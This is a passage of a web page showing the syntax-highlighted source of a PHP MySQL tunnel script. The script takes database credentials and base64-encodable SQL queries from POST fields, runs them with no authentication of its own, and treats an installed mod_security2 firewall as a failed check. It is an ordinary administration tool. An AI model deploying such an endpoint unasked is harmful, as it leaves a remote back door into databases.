class="variable">$count</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$count</span>;<span class="variable">$i</span>++)</span><br><span class="line">		<span class="variable">$str</span> .= <span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetBlock</span>(<span class="params"><span class="variable">$val</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$len</span> = strlen(<span class="variable">$val</span>);</span><br><span class="line">	<span class="keyword">if</span>( <span class="variable">$len</span> &lt; <span class="number">254</span> )</span><br><span class="line">		<span class="keyword">return</span> chr(<span class="variable">$len</span>).<span class="variable">$val</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;\xFE&quot;</span>.GetLongBinary(<span class="variable">$len</span>).<span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EchoHeader</span>(<span class="params"><span class="variable">$errno</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$str</span> = GetLongBinary(<span class="number">1111</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetShortBinary(<span class="number">202</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$errno</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetDummy(<span class="number">6</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EchoConnInfo</span>(<span class="params"><span class="variable">$conn</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$GLOBALS</span>[<span class="string">&#x27;use_mysqli&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$str</span> = GetBlock(mysqli_get_host_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="variable">$str</span> .= GetBlock(mysqli_get_proto_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="variable">$str</span> .= GetBlock(mysqli_get_server_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$str</span> = GetBlock(mysql_get_host_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="variable">$str</span> .= GetBlock(mysql_get_proto_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="variable">$str</span> .= GetBlock(mysql_get_server_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EchoResultSetHeader</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$affectrows</span>, <span class="variable">$insertid</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$str</span> = GetLongBinary(<span class="variable">$errno</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$affectrows</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$insertid</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$numfields</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$numrows</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetDummy(<span class="number">12</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EchoFieldsHeader</span>(<span class="params"><span class="variable">$res</span>, <span class="variable">$numfields</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$numfields</span>; <span class="variable">$i</span>++ ) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$GLOBALS</span>[<span class="string">&#x27;use_mysqli&#x27;</span>]) &#123;</span><br><span class="line">			<span class="variable">$finfo</span> = mysqli_fetch_field_direct(<span class="variable">$res</span>, <span class="variable">$i</span>);</span><br><span class="line">			<span class="variable">$str</span> .= GetBlock(<span class="variable">$finfo</span>-&gt;name);</span><br><span class="line">			<span class="variable">$str</span> .= GetBlock(<span class="variable">$finfo</span>-&gt;table);</span><br><span class="line">			</span><br><span class="line">			<span class="variable">$type</span> = <span class="variable">$finfo</span>-&gt;type;</span><br><span class="line">			<span class="variable">$length</span> = <span class="variable">$finfo</span>-&gt;length;</span><br><span class="line">		</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$type</span>);</span><br><span class="line">	</span><br><span class="line">			<span class="variable">$intflag</span> = <span class="variable">$finfo</span>-&gt;flags;</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$intflag</span>);</span><br><span class="line">	</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$length</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$str</span> .= GetBlock(mysql_field_name(<span class="variable">$res</span>, <span class="variable">$i</span>));</span><br><span class="line">			<span class="variable">$str</span> .= GetBlock(mysql_field_table(<span class="variable">$res</span>, <span class="variable">$i</span>));</span><br><span class="line">	</span><br><span class="line">			<span class="variable">$type</span> = mysql_field_type(<span class="variable">$res</span>, <span class="variable">$i</span>);</span><br><span class="line">			<span class="variable">$length</span> = mysql_field_len(<span class="variable">$res</span>, <span class="variable">$i</span>);</span><br><span class="line">			<span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;int&quot;</span>:</span><br><span class="line">					<span class="keyword">if</span>( <span class="variable">$length</span> &gt; <span class="number">11</span> ) <span class="variable">$type</span> = <span class="number">8</span>;</span><br><span class="line">					<span class="keyword">else</span> <span class="variable">$type</span> = <span class="number">3</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;real&quot;</span>:</span><br><span class="line">					<span class="keyword">if</span>( <span class="variable">$length</span> == <span class="number">12</span> ) <span class="variable">$type</span> = <span class="number">4</span>;</span><br><span class="line">					<span class="keyword">elseif</span>( <span class="variable">$length</span> == <span class="number">22</span> ) <span class="variable">$type</span> = <span class="number">5</span>;</span><br><span class="line">					<span class="keyword">else</span> <span class="variable">$type</span> = <span class="number">0</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;null&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">6</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;timestamp&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">7</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;date&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">10</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;time&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">11</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;datetime&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">12</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;year&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">13</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;blob&quot;</span>:</span><br><span class="line">					<span class="keyword">if</span>( <span class="variable">$length</span> &gt; <span class="number">16777215</span> ) <span class="variable">$type</span> = <span class="number">251</span>;</span><br><span class="line">					<span class="keyword">elseif</span>( <span class="variable">$length</span> &gt; <span class="number">65535</span> ) <span class="variable">$type</span> = <span class="number">250</span>;</span><br><span class="line">					<span class="keyword">elseif</span>( <span class="variable">$length</span> &gt; <span class="number">255</span> ) <span class="variable">$type</span> = <span class="number">252</span>;</span><br><span class="line">					<span class="keyword">else</span> <span class="variable">$type</span> = <span class="number">249</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">default</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">253</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$type</span>);</span><br><span class="line">	</span><br><span class="line">			<span class="variable">$flags</span> = explode( <span class="string">&quot; &quot;</span>, mysql_field_flags ( <span class="variable">$res</span>, <span class="variable">$i</span> ) );</span><br><span class="line">			<span class="variable">$intflag</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;not_null&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;primary_key&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;unique_key&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">4</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;multiple_key&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">8</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;blob&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">16</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;unsigned&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">32</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;zerofill&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">64</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;binary&quot;</span>, <span class="variable">$flags</span>)) <span class="variable">$intflag</span> += <span class="number">128</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;enum&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">256</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;auto_increment&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">512</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;timestamp&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">1024</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;set&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">2048</span>;</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$intflag</span>);</span><br><span class="line">	</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$length</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EchoData</span>(<span class="params"><span class="variable">$res</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$numrows</span>; <span class="variable">$i</span>++ ) &#123;</span><br><span class="line">		<span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$row</span> = <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$GLOBALS</span>[<span class="string">&#x27;use_mysqli&#x27;</span>])</span><br><span class="line">			<span class="variable">$row</span> = mysqli_fetch_row( <span class="variable">$res</span> );</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="variable">$row</span> = mysql_fetch_row( <span class="variable">$res</span> );</span><br><span class="line">		<span class="keyword">for</span>( <span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$numfields</span>; <span class="variable">$j</span>++ )&#123;</span><br><span class="line">			<span class="keyword">if</span>( is_null(<span class="variable">$row</span>[<span class="variable">$j</span>]) )</span><br><span class="line">				<span class="variable">$str</span> .= <span class="string">&quot;\xFF&quot;</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="variable">$str</span> .= GetBlock(<span class="variable">$row</span>[<span class="variable">$j</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSystemTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$description</span>, <span class="variable">$succ</span>, <span class="variable">$resStr</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td class=\&quot;TestDesc\&quot;&gt;<span class="subst">$description</span>&lt;/td&gt;&lt;td &quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> (<span class="variable">$succ</span>)? <span class="string">&quot;class=\&quot;TestSucc\&quot;&gt;<span class="subst">$resStr</span>[0]&lt;/td&gt;&lt;/tr&gt;&quot;</span> : <span class="string">&quot;class=\&quot;TestFail\&quot;&gt;<span class="subst">$resStr</span>[1]&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	output(<span class="string">&quot;PHP version &gt;= 4.0.5&quot;</span>, phpversion_int() &gt;= <span class="number">40005</span>, <span class="keyword">array</span>(<span class="string">&quot;Yes&quot;</span>, <span class="string">&quot;No&quot;</span>));</span><br><span class="line">	output(<span class="string">&quot;mysql_connect() available&quot;</span>, function_exists(<span class="string">&quot;mysql_connect&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;Yes&quot;</span>, <span class="string">&quot;No&quot;</span>));</span><br><span class="line">	output(<span class="string">&quot;mysqli_connect() available&quot;</span>, function_exists(<span class="string">&quot;mysqli_connect&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;Yes&quot;</span>, <span class="string">&quot;No&quot;</span>));</span><br><span class="line">	<span class="keyword">if</span> (phpversion_int() &gt;= <span class="number">40302</span> &amp;&amp; substr(<span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_SOFTWARE&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) == <span class="string">&quot;Apache&quot;</span> &amp;&amp; function_exists(<span class="string">&quot;apache_get_modules&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span> (in_array(<span class="string">&quot;mod_security2&quot;</span>, apache_get_modules()))</span><br><span class="line">			output(<span class="string">&quot;Mod Security 2 installed&quot;</span>, <span class="literal">false</span>, <span class="keyword">array</span>(<span class="string">&quot;No&quot;</span>, <span class="string">&quot;Yes&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">////</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (phpversion_int() &lt; <span class="number">40005</span>) &#123;</span><br><span class="line">		EchoHeader(<span class="number">201</span>);</span><br><span class="line">		<span class="keyword">echo</span> GetBlock(<span class="string">&quot;unsupported php version&quot;</span>);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (phpversion_int() &lt; <span class="number">40010</span>) &#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$HTTP_POST_VARS</span>;</span><br><span class="line">		<span class="variable">$_POST</span> = &amp;<span class="variable">$HTTP_POST_VARS</span>;	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;actn&quot;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;host&quot;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;port&quot;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login&quot;</span>])) &#123;</span><br><span class="line">		<span class="variable">$testMenu</span> = <span class="variable">$allowTestMenu</span>;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$testMenu</span>)&#123;</span><br><span class="line">			EchoHeader(<span class="number">202</span>);</span><br><span class="line">			<span class="keyword">echo</span> GetBlock(<span class="string">&quot;invalid parameters&quot;</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$testMenu</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;encodeBase64&quot;</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>]);<span class="variable">$i</span>++)</span><br><span class="line">				<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>][<span class="variable">$i</span>] = base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>][<span class="variable">$i</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (!function_exists(<span class="string">&quot;mysql_connect&quot;</span>) &amp;&amp; !function_exists(<span class="string">&quot;mysqli_connect&quot;</span>)) &#123;</span><br><span class="line">			EchoHeader(<span class="number">203</span>);</span><br><span class="line">			<span class="keyword">echo</span> GetBlock(<span class="string">&quot;MySQL not supported on the server&quot;</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$errno_c</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="variable">$hs</span> = <span class="variable">$_POST</span>[<span class="string">&quot;host&quot;</span>];</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$use_mysqli</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>( <span class="variable">$_POST</span>[<span class="string">&quot;port&quot;</span>] )</span><br><span class="line">				<span class="variable">$conn</span> = mysqli_connect(<span class="variable">$hs</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login&quot;</span>], <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>], <span class="string">&quot;&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;port&quot;</span>]);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="variable">$conn</span> = mysqli_connect(<span class="variable">$hs</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login&quot;</span>], <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line">			<span class="variable">$errno_c</span> = mysqli_connect_errno(<span class="variable">$conn</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$errno_c</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				EchoHeader(<span class="variable">$errno_c</span>);</span><br><span class="line">				<span class="keyword">echo</span> GetBlock(mysqli_connect_error(<span class="variable">$conn</span>));</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>((<span class="variable">$errno_c</span> &lt;= <span class="number">0</span>) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&quot;db&quot;</span>] != <span class="string">&quot;&quot;</span> )) &#123;</span><br><span class="line">				<span class="variable">$res</span> = mysqli_select_db(<span class="variable">$conn</span>, <span class="variable">$_POST</span>[<span class="string">&quot;db&quot;</span>] );</span><br><span class="line">				<span class="variable">$errno_c</span> = mysqli_errno(<span class="variable">$conn</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			EchoHeader(<span class="variable">$errno_c</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$errno_c</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">echo</span> GetBlock(mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">			&#125; <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&quot;actn&quot;</span>] == <span class="string">&quot;C&quot;</span>) &#123;</span><br><span class="line">				EchoConnInfo(<span class="variable">$conn</span>);</span><br><span class="line">			&#125; <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&quot;actn&quot;</span>] == <span class="string">&quot;Q&quot;</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>]);<span class="variable">$i</span>++) &#123;</span><br><span class="line">					<span class="variable">$query</span> = <span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>][<span class="variable">$i</span>];</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$query</span> == <span class="string">&quot;&quot;</span>) <span class="keyword">continue</span>;</span><br><span class="line">					<span class="keyword">if</span> (phpversion_int() &lt; <span class="number">50400</span>)&#123;  </span><br><span class="line">						<span class="keyword">if</span>(get_magic_quotes_gpc())</span><br><span class="line">							<span class="variable">$query</span> = stripslashes(<span class="variable">$query</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$query</span>);</span><br><span class="line">					<span class="variable">$errno</span> = mysqli_errno(<span class="variable">$conn</span>);</span><br><span class="line">					<span class="variable">$affectedrows</span> = mysqli_affected_rows(<span class="variable">$conn</span>);</span><br><span class="line">					<span class="variable">$insertid</span> = mysqli_insert_id(<span class="variable">$conn</span>);				</span><br><span class="line">					<span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$res</span>) &#123;</span><br><span class="line">						<span class="variable">$numfields</span> = mysqli_field_count(<span class="variable">$conn</span>);</span><br><span class="line">						<span class="variable">$numrows</span> = mysqli_num_rows(<span class="variable">$res</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="variable">$numfields</span> = <span class="number">0</span>;</span><br><span class="line">						<span class="variable">$numrows</span> = <span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					EchoResultSetHeader(<span class="variable">$errno</span>, <span class="variable">$affectedrows</span>, <span class="variable">$insertid</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$errno</span> &gt; <span class="number">0</span>)</span><br><span class="line">						<span class="keyword">echo</span> GetBlock(mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">					<span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$numfields</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">							EchoFieldsHeader(<span class="variable">$res</span>, <span class="variable">$numfields</span>);</span><br><span class="line">							EchoData(<span class="variable">$res</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span>);</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="keyword">if</span>(phpversion_int() &gt;= <span class="number">40300</span>)</span><br><span class="line">								<span class="keyword">echo</span> GetBlock(mysqli_info(<span class="variable">$conn</span>));</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">								<span class="keyword">echo</span> GetBlock(<span class="string">&quot;&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$i</span>&lt;(count(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>])-<span class="number">1</span>))</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;\x01&quot;</span>;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">					<span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$res</span>)</span><br><span class="line">						mysqli_free_result(<span class="variable">$res</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>( <span class="variable">$_POST</span>[<span class="string">&quot;port&quot;</span>] ) <span class="variable">$hs</span> .= <span class="string">&quot;:&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;port&quot;</span>];</span><br><span class="line">			<span class="variable">$conn</span> = mysql_connect(<span class="variable">$hs</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login&quot;</span>], <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line">			<span class="variable">$errno_c</span> = mysql_errno();</span><br><span class="line">			<span class="comment">//if (phpversion_int() &gt;= 50203)&#123;  // for unicode database name</span></span><br><span class="line">			<span class="comment">//	mysql_set_charset(&#x27;UTF8&#x27;);</span></span><br><span class="line">			<span class="comment">//&#125;</span></span><br><span class="line">			<span class="keyword">if</span>((<span class="variable">$errno_c</span> &lt;= <span class="number">0</span>) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&quot;db&quot;</span>] != <span class="string">&quot;&quot;</span> )) &#123;</span><br><span class="line">				<span class="variable">$res</span> = mysql_select_db( <span class="variable">$_POST</span>[<span class="string">&quot;db&quot;</span>], <span class="variable">$conn</span>);</span><br><span class="line">				<span class="variable">$errno_c</span> = mysql_errno();</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			EchoHeader(<span class="variable">$errno_c</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$errno_c</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">echo</span> GetBlock(mysql_error());</span><br><span class="line">			&#125; <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&quot;actn&quot;</span>] == <span class="string">&quot;C&quot;</span>) &#123;</span><br><span class="line">				EchoConnInfo(<span class="variable">$conn</span>);</span><br><span class="line">			&#125; <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&quot;actn&quot;</span>] == <span class="string">&quot;Q&quot;</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>]);<span class="variable">$i</span>++) &#123;</span><br><span class="line">					<span class="variable">$query</span> = <span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>][<span class="variable">$i</span>];</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$query</span> == <span class="string">&quot;&quot;</span>) <span class="keyword">continue</span>;</span><br><span class="line">					<span class="keyword">if</span> (phpversion_int() &lt; <span class="number">50400</span>)&#123;  </span><br><span class="line">						<span class="keyword">if</span>(get_magic_quotes_gpc())</span><br><span class="line">							<span class="variable">$query</span> = stripslashes(<span class="variable">$query</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="variable">$res</span> = mysql_query(<span class="variable">$query</span>, <span class="variable">$conn</span>);</span><br><span class="line">					<span class="variable">$errno</span> = mysql_errno();</span><br><span class="line">					<span class="variable">$affectedrows</span> = mysql_affected_rows(<span class="variable">$conn</span>);</span><br><span class="line">					<span class="variable">$insertid</span> = mysql_insert_id(<span class="variable">$conn</span>);</span><br><span class="line">					<span class="variable">$numfields</span> = mysql_num_fields(<span class="variable">$res</span>);</span><br><span class="line">					<span class="variable">$numrows</span> = mysql_num_rows(<span class="variable">$res</span>);</span><br><span class="line">					EchoResultSetHeader(<span class="variable">$errno</span>, <span class="variable">$affectedrows</span>, <span class="variable">$insertid</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$errno</span> &gt; <span class="number">0</span>)</span><br><span class="line">						<span class="keyword">echo</span> GetBlock(mysql_error());</span><br><span class="line">					<span class="keyword">else</span> 